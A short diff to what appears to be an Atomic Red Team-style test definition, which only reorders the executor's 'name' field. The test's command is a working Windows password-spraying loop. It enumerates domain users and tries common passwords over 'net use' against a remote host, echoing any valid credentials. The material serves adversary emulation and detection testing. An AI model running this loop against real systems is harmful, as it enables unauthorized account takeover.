@@ -25,10 +25,10 @@ atomic_tests:
       type: String
       default: YOUR_COMPANY
   executor:
+    name: command_prompt
     command: |
       net user /domain > #{input_file_users}
       echo "Password1" >> #{input_file_passwords}
       echo "1q2w3e4r" >> #{input_file_passwords}
       echo "Password!" >> #{input_file_passwords}
       @FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
-    name: command_prompt
